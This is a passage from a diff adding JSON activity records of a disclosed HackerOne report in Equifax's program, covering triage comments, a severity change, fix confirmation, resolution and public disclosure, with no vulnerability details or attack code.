+                "old_severity": "Medium (6.4)",
+                "new_severity": "Medium (5.6)",
+                "old_severity_id": 1798528,
+                "new_severity_id": 1799057
+            },
+            "actor": {
+                "username": "h1_analyst_magnus",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_magnus",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/oh5rnn06wtaj1jegmqf5omn4hyu9/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": true,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "equifax"
+        },
+        {
+            "id": 19979744,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hello @broook_dz \nThank you for vulnerability report! We're currently reviewing its details and working with internal remediation teams\nto determine a proper resolution. We will continue to update you as we work through this process.\nThanks,",
+            "automated_response": false,
+            "created_at": "2023-01-18T19:41:20.967Z",
+            "updated_at": "2023-01-18T19:41:20.967Z",
+            "actor": {
+                "username": "asv01",
+                "cleared": false,
+                "verified": false,
+                "url": "/asv01",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "equifax"
+        },
+        {
+            "id": 20916586,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hello @abdoj can you please re-test this, we have a applied a fix, please let us know if you still able to see the issue, thanks ",
+            "automated_response": false,
+            "created_at": "2023-03-22T13:54:17.732Z",
+            "updated_at": "2023-03-22T13:54:35.180Z",
+            "actor": {
+                "username": "asv01",
+                "cleared": false,
+                "verified": false,
+                "url": "/asv01",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "equifax"
+        },
+        {
+            "id": 20935617,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": " the fix works.",
+            "automated_response": false,
+            "created_at": "2023-03-23T17:33:25.384Z",
+            "updated_at": "2023-03-23T17:33:25.384Z",
+            "actor": {
+                "username": "abdo0x",
+                "cleared": false,
+                "verified": false,
+                "url": "/abdo0x",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/a2kio7paukmmfxy3xvh18atwe9n6/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "equifax"
+        },
+        {
+            "id": 20935632,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugResolved",
+            "message": "Resolved",
+            "automated_response": false,
+            "created_at": "2023-03-23T17:34:17.425Z",
+            "updated_at": "2023-03-23T17:34:17.425Z",
+            "actor": {
+                "username": "asv01",
+                "cleared": false,
+                "verified": false,
+                "url": "/asv01",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "reporter": {
+                "username": "abdo0x",
+                "url": "/abdo0x"
+            },
+            "genius_execution_id": null,
+            "team_handle": "equifax"
+        },
+        {
+            "id": 20944284,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2023-03-24T12:40:14.871Z",
+            "updated_at": "2023-03-24T12:40:14.871Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "abdo0x",
+                "cleared": false,
+                "verified": false,
+                "url": "/abdo0x",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/a2kio7paukmmfxy3xvh18atwe9n6/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "equifax"
+        },
+        {
+            "id": 20948013,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "can we disclose this report",
+            "automated_response": false,
+            "created_at": "2023-03-24T17:46:34.847Z",
+            "updated_at": "2023-03-24T17:46:34.847Z",
+            "actor": {
+                "username": "abdo0x",
+                "cleared": false,
+                "verified": false,
+                "url": "/abdo0x",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/a2kio7paukmmfxy3xvh18atwe9n6/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "equifax"
+        },
+        {
+            "id": 21512671,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2023-04-23T12:40:15.421Z",
+            "updated_at": "2023-04-23T12:40:15.421Z",
+            "actor": {
+                "url": "/equifax",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/005/044/ba20ca159dad308d753710d2b8ae8dd665a60b80_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "Equifax-vdp"
+                }
+            },
+            "genius_execution_id": null,
+            "team_handle": "equifax"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
